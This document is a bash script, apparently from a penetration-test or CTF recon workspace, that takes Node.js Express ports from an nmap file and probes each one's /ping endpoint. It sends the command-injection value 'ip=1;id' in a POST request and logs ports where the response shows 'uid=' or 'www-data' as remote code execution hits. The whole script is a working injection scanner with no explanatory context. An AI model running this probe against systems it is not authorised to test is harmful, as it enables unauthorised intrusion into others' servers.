#!/usr/bin/env bash
set -euo pipefail
IP=${1:?IP}
NMAP_FILE=${2:?NMAP_FILE}
TO=${3:-8}
OUT_DIR=${4:-/workspace/recon/httpx}
DIR="$OUT_DIR/${IP}_probe_ping"
mkdir -p "$DIR"
# Collect Node.js Express ports
PORTS=$(awk '/\/tcp\s+open\s+http\s+Node\.js Express framework/{print $1}' "$NMAP_FILE" | cut -d/ -f1 | sort -n | uniq)
# Add some known candidates
PORTS="$PORTS 30497 32271 33930 44825 46530 48656 50692"
# De-dup
PORTS=$(printf '%s\n' $PORTS | awk 'NF' | sort -n | uniq)
printf '%s\n' $PORTS > "$DIR/ports.txt"
# Probe each port for / and /ping
: > "$DIR/rce_hits.txt"
while read -r p; do
  [ -z "$p" ] && continue
  base="http://$IP:$p"
  curl -fsS -m "$TO" --connect-timeout "$TO" -i "$base/" > "$DIR/${p}_index.head" 2>/dev/null || true
  curl -fsS -m "$TO" --connect-timeout "$TO" -i "$base/ping" > "$DIR/${p}_ping.head" 2>/dev/null || true
  # Injection test
  RES=$(curl -fsS -m "$TO" --connect-timeout "$TO" -s -X POST --data-urlencode 'ip=1;id' "$base/ping" || true)
  printf '%s\n' "$RES" | head -n 5 > "$DIR/${p}_ping_inj.txt"
  if echo "$RES" | grep -qiE 'uid=|www-data|linux'; then echo "$p" | tee -a "$DIR/rce_hits.txt"; fi
  sleep 0.05
done < "$DIR/ports.txt"
# Show findings
sed -n '1,80p' "$DIR/rce_hits.txt" || true
